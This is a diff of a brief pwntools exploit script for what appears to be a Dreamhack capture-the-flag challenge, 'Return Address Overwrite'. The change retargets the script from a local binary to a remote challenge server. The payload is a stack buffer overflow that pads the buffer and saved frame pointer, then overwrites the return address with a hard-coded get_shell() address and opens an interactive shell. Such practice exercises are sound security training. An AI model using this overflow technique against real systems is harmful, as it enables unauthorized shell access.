@@ -1,14 +1,12 @@
-from pwn import *          # Import pwntools module
+from pwn import remote
 
-p = process('./Return Address Overwrite/problem/rao')       # Spawn process './rao'
-
-elf = ELF('./Return Address Overwrite/problem/rao')
-get_shell = elf.symbols['get_shell']       # The address of get_shell()
+port = 24277
+rem = remote("host3.dreamhack.games", port)
 
 payload = b'A'*0x30        #|       buf      |  <= 'A'*0x30
 payload += b'B'*0x8        #|       SFP      |  <= 'B'*0x8
-payload += p64(get_shell)  #| Return address |  <= '\xaa\x06\x40\x00\x00\x00\x00\x00'
+payload += b'\xaa\x06\x40\x00\x00\x00\x00\x00'
 
-p.sendline(payload)        # Send payload to './rao'
+rem.sendline(payload)
 
-p.interactive()   
+rem.interactive()
